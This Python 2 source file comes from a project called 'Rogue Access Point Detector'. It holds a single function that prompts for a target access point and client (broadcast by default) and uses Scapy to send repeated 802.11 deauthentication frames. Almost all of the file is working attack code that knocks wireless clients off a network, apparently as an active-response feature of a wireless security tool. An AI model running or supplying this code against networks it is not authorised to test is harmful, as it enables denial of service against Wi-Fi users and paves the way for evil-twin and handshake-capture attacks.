#!/usr/bin/python2
# -*- coding: utf-8 -*-
# Rogue Access Point Detector
# version: 0.1
# author: anotherik (Ricardo Gonçalves)

# Supress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import modules.colors as colors
import requests, json, subprocess
import modules.logs.logs_api as logs_api
import modules.manage_interfaces as manage_interfaces

def deauthenticate(iface):

	target_ap_bssid = str(raw_input(colors.get_color("ORANGE")+"Enter target AP (BSSID): "+colors.get_color("ENDC")))
	target_client_bssid = str(raw_input(colors.get_color("ORANGE")+"Enter target Client (BSSID) [empty for brodcast]: "+colors.get_color("ENDC")))
	if (target_client_bssid == ''):
		target_client_bssid = ":".join(["ff"]*6)

	number_of_times = input(colors.get_color("ORANGE")+"How many times: "+colors.get_color("ENDC"))	
	number_of_pkts = input(colors.get_color("ORANGE")+"Number of deauth packets: "+colors.get_color("ENDC"))

	pkt = RadioTap() / Dot11(type=0,subtype=12,addr1=target_client_bssid,addr2=target_ap_bssid,addr3=target_ap_bssid) / Dot11Deauth(reason=7)

	for n in range(number_of_times):
		sendp(pkt, iface=iface, count=number_of_pkts)
		print(colors.get_color("ORANGE")+"[%s]" %(n+1) +" Deauth sent from: "+iface+" BSSID: "+target_ap_bssid+ " for Client: "+target_client_bssid+colors.get_color("ENDC"))

	print ("Switching to monitor mode...")
	manage_interfaces.disable_monitor(iface)
	print (colors.get_color("GRAY") + "\nExiting...\nGoodbye!"+colors.get_color("ENDC"))
